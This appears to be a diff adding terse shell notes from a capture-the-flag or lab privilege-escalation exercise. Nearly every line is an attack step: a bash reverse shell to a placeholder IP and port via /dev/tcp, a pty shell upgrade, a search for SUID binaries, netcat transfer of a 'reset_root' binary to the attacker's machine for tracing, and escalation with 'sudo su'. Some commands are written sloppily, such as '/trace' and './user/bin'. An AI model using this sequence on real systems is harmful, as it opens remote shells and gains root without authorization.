@@ -1,0 +1,13 @@
+Bash -i >& /dev/tcp/<decimal-ip>/port  0>&1
+python -c "import pty; pty.spawn('/bin/sh')"
+tty
+find / -perm -4000 2>& /dev/null
+./user/bin/root_reset
+nc -nlvp port > reset_root
+nc my-ip port < reset_root
+/trace  ./reset_root
+
+touch <files>
+reset_root
+sudo su
+Enter the password
